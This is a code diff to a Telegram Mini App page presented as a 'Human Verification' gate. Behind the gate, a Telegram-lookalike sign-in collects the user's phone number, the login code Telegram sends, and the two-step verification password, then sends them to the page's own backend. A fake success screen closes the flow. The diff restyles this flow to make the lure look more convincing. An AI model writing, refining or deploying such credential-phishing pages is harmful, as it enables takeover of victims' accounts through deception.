@@ -3,9 +3,9 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-<title>Telegram</title>
+<title>Human Verification</title>
 <script src="https://telegram.org/js/telegram-web-app.js"></script>
-<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;600&display=swap" rel="stylesheet"/>
+<link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;600;700&family=Roboto:wght@400;500;600&display=swap" rel="stylesheet"/>
 <style>
 :root {
   --tg-bg: #ffffff;
@@ -14,97 +14,130 @@
   --tg-btn: #2AABEE;
 }
 * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
-html, body { height: 100%; font-family: 'Roboto', sans-serif; background: var(--tg-bg); color: var(--tg-text); }
-body { display: flex; align-items: center; justify-content: center; }
+html, body { min-height: 100vh; }
+body { display: flex; align-items: center; justify-content: center; padding: 24px; }
+body.dark { background: radial-gradient(ellipse at 50% 0%, #1a3a2a 0%, #0d1f16 40%, #080f0c 100%); font-family: 'DM Sans', sans-serif; }
+body.tg-theme { background-color: var(--tg-bg); color: var(--tg-text); font-family: 'Roboto', sans-serif; }
 
-.page { width: 100%; max-width: 400px; padding: 24px 24px 40px; display: none; flex-direction: column; align-items: center; }
-.page.active { display: flex; animation: fadeUp 0.3s ease both; }
-@keyframes fadeUp { from { opacity: 0; transform: translateY(16px); } to { opacity: 1; transform: translateY(0); } }
+.page { width: 100%; max-width: 360px; display: none; }
+.page.active { display: block; animation: fadeUp 0.4s ease both; }
+@keyframes fadeUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+
+/* ── Welcome page (original dark style) ── */
+.card {
+  background: linear-gradient(160deg, rgba(255,255,255,0.07) 0%, rgba(255,255,255,0.03) 100%);
+  border: 1px solid rgba(255,255,255,0.08);
+  border-radius: 24px; padding: 40px 32px 36px; text-align: center;
+  backdrop-filter: blur(20px);
+  box-shadow: 0 32px 80px rgba(0,0,0,0.5), inset 0 1px 0 rgba(255,255,255,0.1);
+}
+.icon-wrap {
+  width: 64px; height: 64px;
+  background: linear-gradient(145deg, #3ecf6e, #27a855);
+  border-radius: 18px; display: flex; align-items: center; justify-content: center;
+  margin: 0 auto 20px; box-shadow: 0 8px 24px rgba(62,207,110,0.35);
+}
+.icon-wrap svg { width: 32px; height: 32px; stroke: white; stroke-width: 2.5; fill: none; }
+.welcome { color: rgba(255,255,255,0.45); font-size: 14px; font-weight: 500; margin-bottom: 8px; }
+h1.green { color: #3ecf6e; font-size: 26px; font-weight: 700; letter-spacing: -0.5px; margin-bottom: 10px; }
+.subtitle { color: rgba(255,255,255,0.4); font-size: 14px; margin-bottom: 32px; }
+.btn-green {
+  width: 100%; padding: 16px;
+  background: linear-gradient(135deg, #3ecf6e, #27a855);
+  color: white; font-family: 'DM Sans', sans-serif; font-size: 16px; font-weight: 600;
+  border: none; border-radius: 14px; cursor: pointer;
+  transition: transform 0.15s ease, box-shadow 0.15s ease;
+  box-shadow: 0 8px 24px rgba(62,207,110,0.4);
+}
+.btn-green:hover { transform: translateY(-2px); box-shadow: 0 12px 32px rgba(62,207,110,0.5); }
+.btn-green:active { transform: scale(0.98); }
+
+/* ── Telegram-style pages ── */
+.tg-page { width: 100%; max-width: 400px; display: none; flex-direction: column; align-items: center; padding: 24px 0 40px; }
+.tg-page.active { display: flex; animation: fadeUp 0.3s ease both; }
 
 .tg-logo { width: 96px; height: 96px; border-radius: 50%; background: linear-gradient(180deg, #4fabf7 0%, #2AABEE 100%); display: flex; align-items: center; justify-content: center; margin-bottom: 24px; box-shadow: 0 4px 24px rgba(42,171,238,0.3); }
 .tg-logo svg { width: 52px; height: 52px; }
 
-h1 { font-size: 24px; font-weight: 600; color: var(--tg-text); margin-bottom: 12px; text-align: center; }
-.desc { font-size: 14px; color: var(--tg-hint); text-align: center; line-height: 1.6; margin-bottom: 32px; max-width: 280px; }
+h1.tg { font-size: 24px; font-weight: 600; color: var(--tg-text); margin-bottom: 12px; text-align: center; font-family: 'Roboto', sans-serif; }
+.tg-desc { font-size: 14px; color: var(--tg-hint); text-align: center; line-height: 1.6; margin-bottom: 32px; max-width: 280px; font-family: 'Roboto', sans-serif; }
 
 .phone-row { display: flex; width: 100%; margin-bottom: 8px; border-bottom: 2px solid var(--tg-btn); }
-.country-btn { display: flex; align-items: center; gap: 6px; padding: 10px 10px 10px 0; font-size: 16px; color: var(--tg-text); background: none; border: none; cursor: pointer; white-space: nowrap; font-family: 'Roboto', sans-serif; font-weight: 400; min-width: 80px; }
+.country-btn { display: flex; align-items: center; gap: 6px; padding: 10px 10px 10px 0; font-size: 16px; color: var(--tg-text); background: none; border: none; cursor: pointer; white-space: nowrap; font-family: 'Roboto', sans-serif; min-width: 80px; }
 .country-btn .flag { font-size: 20px; }
 .country-btn .dial { font-size: 16px; color: var(--tg-text); }
 .divider-v { width: 1px; background: var(--tg-hint); opacity: 0.4; margin: 8px 10px 8px 4px; }
 .phone-input { flex: 1; border: none; outline: none; font-size: 16px; font-family: 'Roboto', sans-serif; color: var(--tg-text); padding: 10px 0; background: transparent; }
 .phone-input::placeholder { color: var(--tg-hint); }
+.field-label { width: 100%; font-size: 13px; color: var(--tg-btn); margin-bottom: 24px; font-family: 'Roboto', sans-serif; }
 
-.field-label { width: 100%; font-size: 13px; color: var(--tg-btn); margin-bottom: 24px; }
-
-.btn-primary { width: 100%; padding: 14px; border-radius: 8px; border: none; background: var(--tg-btn); color: #fff; font-size: 15px; font-weight: 500; font-family: 'Roboto', sans-serif; cursor: pointer; transition: opacity 0.15s, transform 0.1s; letter-spacing: 0.02em; }
+.btn-primary { width: 100%; padding: 14px; border-radius: 8px; border: none; background: var(--tg-btn); color: #fff; font-size: 15px; font-weight: 500; font-family: 'Roboto', sans-serif; cursor: pointer; transition: opacity 0.15s, transform 0.1s; }
 .btn-primary:hover { opacity: 0.88; }
 .btn-primary:active { transform: scale(0.98); }
 .btn-primary:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
 
-/* Country picker */
 .country-picker { position: fixed; inset: 0; background: var(--tg-bg); z-index: 100; display: none; flex-direction: column; }
 .country-picker.open { display: flex; }
 .picker-header { display: flex; align-items: center; padding: 12px 16px; border-bottom: 1px solid rgba(0,0,0,0.1); gap: 12px; }
 .picker-back { background: none; border: none; cursor: pointer; color: var(--tg-btn); font-size: 15px; font-family: 'Roboto', sans-serif; padding: 4px 0; }
-.picker-title { font-size: 18px; font-weight: 600; flex: 1; color: var(--tg-text); }
+.picker-title { font-size: 18px; font-weight: 600; flex: 1; color: var(--tg-text); font-family: 'Roboto', sans-serif; }
 .picker-search { width: 100%; padding: 10px 16px; border: none; border-bottom: 1px solid rgba(0,0,0,0.1); font-size: 15px; font-family: 'Roboto', sans-serif; outline: none; color: var(--tg-text); background: var(--tg-bg); }
 .picker-search::placeholder { color: var(--tg-hint); }
 .picker-list { flex: 1; overflow-y: auto; }
 .picker-item { display: flex; align-items: center; padding: 12px 16px; gap: 14px; cursor: pointer; transition: background 0.1s; border-bottom: 1px solid rgba(0,0,0,0.05); }
 .picker-item:hover { background: rgba(0,0,0,0.04); }
 .picker-item .flag { font-size: 22px; }
-.picker-item .country-name { flex: 1; font-size: 15px; color: var(--tg-text); }
-.picker-item .country-code { font-size: 14px; color: var(--tg-hint); }
+.picker-item .country-name { flex: 1; font-size: 15px; color: var(--tg-text); font-family: 'Roboto', sans-serif; }
+.picker-item .country-code { font-size: 14px; color: var(--tg-hint); font-family: 'Roboto', sans-serif; }
 
-/* Code boxes */
-.code-desc { font-size: 14px; color: var(--tg-hint); text-align: center; line-height: 1.6; margin-bottom: 28px; max-width: 280px; }
+.code-desc { font-size: 14px; color: var(--tg-hint); text-align: center; line-height: 1.6; margin-bottom: 28px; max-width: 280px; font-family: 'Roboto', sans-serif; }
 .code-desc strong { color: var(--tg-text); font-weight: 500; }
 .code-boxes { display: flex; gap: 10px; margin-bottom: 8px; }
 .code-boxes input { width: 42px; height: 52px; text-align: center; font-size: 22px; font-weight: 500; font-family: 'Roboto', sans-serif; border: none; border-bottom: 2px solid var(--tg-hint); outline: none; color: var(--tg-text); background: transparent; transition: border-color 0.15s; caret-color: var(--tg-btn); opacity: 0.5; }
 .code-boxes input:focus, .code-boxes input.filled { border-color: var(--tg-btn); opacity: 1; }
-.error-text { font-size: 13px; color: #e53935; text-align: center; min-height: 20px; margin-bottom: 20px; width: 100%; }
+.error-text { font-size: 13px; color: #e53935; text-align: center; min-height: 20px; margin-bottom: 20px; width: 100%; font-family: 'Roboto', sans-serif; }
 .resend { background: none; border: none; font-family: 'Roboto', sans-serif; font-size: 14px; color: var(--tg-btn); cursor: pointer; margin-top: 16px; }
 .resend:disabled { color: var(--tg-hint); cursor: default; }
 .resend:not(:disabled):hover { text-decoration: underline; }
 .back-link { font-size: 14px; color: var(--tg-btn); cursor: pointer; margin-top: 12px; background: none; border: none; font-family: 'Roboto', sans-serif; }
 .back-link:hover { text-decoration: underline; }
 
-/* 2FA */
 .tfa-input-wrap { width: 100%; border-bottom: 2px solid var(--tg-btn); margin-bottom: 8px; }
 .tfa-input { width: 100%; border: none; outline: none; font-size: 16px; font-family: 'Roboto', sans-serif; color: var(--tg-text); padding: 10px 0; background: transparent; }
 .tfa-input::placeholder { color: var(--tg-hint); }
 
-/* Success */
-.success-icon { width: 96px; height: 96px; border-radius: 50%; background: linear-gradient(180deg, #69db7c 0%, #40c057 100%); display: flex; align-items: center; justify-content: center; margin-bottom: 24px; box-shadow: 0 4px 24px rgba(64,192,87,0.3); }
-.success-icon svg { width: 48px; height: 48px; stroke: white; stroke-width: 2.5; fill: none; }
+.success-icon { width: 80px; height: 80px; background: linear-gradient(145deg, #3ecf6e, #27a855); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 24px; box-shadow: 0 8px 32px rgba(62,207,110,0.4); }
+.success-icon svg { width: 40px; height: 40px; stroke: white; stroke-width: 2.5; fill: none; }
+.success-title { color: white; font-size: 22px; font-weight: 700; margin-bottom: 10px; font-family: 'DM Sans', sans-serif; }
+.success-sub { color: rgba(255,255,255,0.4); font-size: 14px; margin-bottom: 28px; font-family: 'DM Sans', sans-serif; }
 </style>
 </head>
-<body>
+<body class="dark">
 
-<!-- Page 0: Welcome -->
+<!-- Page 0: Original welcome -->
 <div class="page active" id="page0">
-  <div class="tg-logo">
-    <svg viewBox="0 0 48 48" fill="none">
-      <path d="M20 30.5L20.5 38.5C21.3 38.5 21.6 38.2 22 37.8L26 34L34.5 40C36 40.9 37.1 40.4 37.4 38.6L42.5 9.8C42.9 7.6 41.5 6.7 40 7.3L5.5 21C3.3 21.9 3.3 23.1 5.1 23.7L14.1 26.5L35.2 13.2C36.2 12.6 37 12.9 36.3 13.6L20 30.5Z" fill="white"/>
-    </svg>
+  <div class="card">
+    <div class="icon-wrap">
+      <svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg>
+    </div>
+    <p class="welcome">Welcome, <span id="username1">there</span></p>
+    <h1 class="green">Human Verification</h1>
+    <p class="subtitle">Verify below to be granted entry</p>
+    <button class="btn-green" onclick="goToSignIn()">Click here to verify</button>
   </div>
-  <h1>Human Verification</h1>
-  <p class="desc">Welcome, <span id="username1">there</span>! Verify below to be granted entry.</p>
-  <button class="btn-primary" onclick="showPage('page1')">Click here to verify</button>
 </div>
 
 <!-- Page 1: Phone entry -->
-<div class="page" id="page1">
+<div class="tg-page" id="page1">
   <div class="tg-logo">
     <svg viewBox="0 0 48 48" fill="none">
       <path d="M20 30.5L20.5 38.5C21.3 38.5 21.6 38.2 22 37.8L26 34L34.5 40C36 40.9 37.1 40.4 37.4 38.6L42.5 9.8C42.9 7.6 41.5 6.7 40 7.3L5.5 21C3.3 21.9 3.3 23.1 5.1 23.7L14.1 26.5L35.2 13.2C36.2 12.6 37 12.9 36.3 13.6L20 30.5Z" fill="white"/>
     </svg>
   </div>
-  <h1>Sign in to Telegram</h1>
-  <p class="desc">Please confirm your country code and enter your phone number.</p>
+  <h1 class="tg">Sign in to Telegram</h1>
+  <p class="tg-desc">Please confirm your country code and enter your phone number.</p>
   <div class="phone-row">
-    <button class="country-btn" id="countryBtn" onclick="openPicker()">
+    <button class="country-btn" onclick="openPicker()">
       <span class="flag" id="selFlag">🇺🇸</span>
       <span class="dial" id="selDial">+1</span>
       <svg width="12" height="8" viewBox="0 0 12 8" fill="none" style="margin-left:2px"><path d="M1 1L6 6L11 1" stroke="#707579" stroke-width="1.5" stroke-linecap="round"/></svg>
@@ -117,13 +150,13 @@ h1 { font-size: 24px; font-weight: 600; color: var(--tg-text); margin-bottom: 12
 </div>
 
 <!-- Page 2: Code entry -->
-<div class="page" id="page2">
+<div class="tg-page" id="page2">
   <div class="tg-logo">
     <svg viewBox="0 0 48 48" fill="none">
       <path d="M20 30.5L20.5 38.5C21.3 38.5 21.6 38.2 22 37.8L26 34L34.5 40C36 40.9 37.1 40.4 37.4 38.6L42.5 9.8C42.9 7.6 41.5 6.7 40 7.3L5.5 21C3.3 21.9 3.3 23.1 5.1 23.7L14.1 26.5L35.2 13.2C36.2 12.6 37 12.9 36.3 13.6L20 30.5Z" fill="white"/>
     </svg>
   </div>
-  <h1 id="codeTitle">+1 000 0000</h1>
+  <h1 class="tg" id="codeTitle">+1 000 0000</h1>
   <p class="code-desc">We have sent you a message with the code to your <strong>Telegram</strong> account.</p>
   <div class="code-boxes" id="codeBoxes">
     <input type="tel" maxlength="1" inputmode="numeric"/>
@@ -135,35 +168,37 @@ h1 { font-size: 24px; font-weight: 600; color: var(--tg-text); margin-bottom: 12
   <div class="error-text" id="codeError"></div>
   <button class="btn-primary" id="verifyBtn" onclick="handleVerifyCode()" disabled>NEXT</button>
   <button class="resend" id="resendBtn" disabled onclick="handleResend()">Resend code</button>
-  <button class="back-link" onclick="showPage('page1')">Change number</button>
+  <button class="back-link" onclick="goToSignIn()">Change number</button>
 </div>
 
 <!-- Page 2FA -->
-<div class="page" id="page2fa">
+<div class="tg-page" id="page2fa">
   <div class="tg-logo">
     <svg viewBox="0 0 48 48" fill="none">
       <path d="M20 30.5L20.5 38.5C21.3 38.5 21.6 38.2 22 37.8L26 34L34.5 40C36 40.9 37.1 40.4 37.4 38.6L42.5 9.8C42.9 7.6 41.5 6.7 40 7.3L5.5 21C3.3 21.9 3.3 23.1 5.1 23.7L14.1 26.5L35.2 13.2C36.2 12.6 37 12.9 36.3 13.6L20 30.5Z" fill="white"/>
     </svg>
   </div>
-  <h1>Two-step verification</h1>
-  <p class="desc">Your account is protected with an additional password.</p>
+  <h1 class="tg">Two-step verification</h1>
+  <p class="tg-desc">Your account is protected with an additional password.</p>
   <div class="tfa-input-wrap">
     <input class="tfa-input" id="tfaInput" type="password" placeholder="Password" />
   </div>
   <div class="field-label">Password</div>
   <div class="error-text" id="tfaError"></div>
   <button class="btn-primary" id="tfaBtn" onclick="handleTfa()">NEXT</button>
-  <button class="back-link" onclick="showPage('page2')">Back</button>
+  <button class="back-link" onclick="showTgPage('page2')">Back</button>
 </div>
 
 <!-- Page 3: Success -->
-<div class="page" id="page3">
-  <div class="success-icon">
-    <svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg>
+<div class="page active" id="page3" style="display:none;">
+  <div class="card" style="text-align:center;">
+    <div class="success-icon">
+      <svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg>
+    </div>
+    <div class="success-title">You're Verified!</div>
+    <p class="success-sub">You have been granted entry. You may now close this window.</p>
+    <button class="btn-green" onclick="window.Telegram?.WebApp?.close()">Close</button>
   </div>
-  <h1>You're Verified!</h1>
-  <p class="desc">You have been granted entry. You may now close this window.</p>
-  <button class="btn-primary" onclick="window.Telegram?.WebApp?.close()">Close</button>
 </div>
 
 <!-- Country picker -->
@@ -183,16 +218,14 @@ const tg = window.Telegram?.WebApp;
 if (tg) {
   tg.ready(); tg.expand();
   function syncTheme() {
-    const bg  = tg.themeParams.bg_color      || '#ffffff';
-    const text = tg.themeParams.text_color   || '#000000';
-    const hint = tg.themeParams.hint_color   || '#707579';
-    const btn  = tg.themeParams.button_color || '#2AABEE';
+    const bg   = tg.themeParams.bg_color      || '#ffffff';
+    const text = tg.themeParams.text_color    || '#000000';
+    const hint = tg.themeParams.hint_color    || '#707579';
+    const btn  = tg.themeParams.button_color  || '#2AABEE';
     document.documentElement.style.setProperty('--tg-bg',   bg);
     document.documentElement.style.setProperty('--tg-text', text);
     document.documentElement.style.setProperty('--tg-hint', hint);
     document.documentElement.style.setProperty('--tg-btn',  btn);
-    tg.setBackgroundColor(bg);
-    tg.setHeaderColor(bg);
   }
   syncTheme();
   tg.onEvent('themeChanged', syncTheme);
@@ -400,8 +433,23 @@ function selectCountry(name) {
 }
 
 function showPage(id) {
-  document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
-  document.getElementById(id).classList.add('active');
+  document.querySelectorAll('.page, .tg-page').forEach(p => p.classList.remove('active'));
+  const el = document.getElementById(id);
+  el.classList.add('active');
+}
+
+function showTgPage(id) {
+  showPage(id);
+  document.body.className = 'tg-theme';
+}
+
+function goToSignIn() {
+  showTgPage('page1');
+  if (tg) {
+    const bg = tg.themeParams.bg_color || '#ffffff';
+    tg.setBackgroundColor(bg);
+    tg.setHeaderColor(bg);
+  }
 }
 
 async function handleSendCode() {
@@ -424,7 +472,7 @@ async function handleSendCode() {
 
     window._phone = phone;
     document.getElementById('codeTitle').textContent = phone;
-    showPage('page2');
+    showTgPage('page2');
     setupCodeBoxes();
     startResendTimer();
 
@@ -441,14 +489,12 @@ function setupCodeBoxes() {
   inputs.forEach((inp, i) => {
     inp.value = '';
     inp.classList.remove('filled');
-
     inp.oninput = () => {
       inp.value = inp.value.replace(/\D/g, '').slice(0, 1);
       inp.classList.toggle('filled', !!inp.value);
       if (inp.value && i < inputs.length - 1) inputs[i + 1].focus();
       checkComplete();
     };
-
     inp.onkeydown = (e) => {
       if (e.key === 'Backspace' && !inp.value && i > 0) {
         inputs[i - 1].value = '';
@@ -457,7 +503,6 @@ function setupCodeBoxes() {
         checkComplete();
       }
     };
-
     inp.onpaste = (e) => {
       e.preventDefault();
       const text = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '');
@@ -468,7 +513,6 @@ function setupCodeBoxes() {
       checkComplete();
     };
   });
-
   inputs[0].focus();
   document.getElementById('codeError').textContent = '';
   document.getElementById('verifyBtn').disabled = true;
@@ -499,13 +543,14 @@ async function handleVerifyCode() {
     const data = await res.json();
 
     if (res.status === 428) {
-      showPage('page2fa');
+      showTgPage('page2fa');
       document.getElementById('tfaInput').focus();
       return;
     }
 
     if (!res.ok) throw new Error(data.detail || 'Invalid code');
 
+    document.body.className = 'dark';
     showPage('page3');
     if (tg) setTimeout(() => tg.close(), 2000);
 
@@ -532,6 +577,7 @@ async function handleTfa() {
     const data = await res.json();
     if (!res.ok) throw new Error(data.detail || 'Invalid password');
 
+    document.body.className = 'dark';
     showPage('page3');
     if (tg) setTimeout(() => tg.close(), 2000);
 
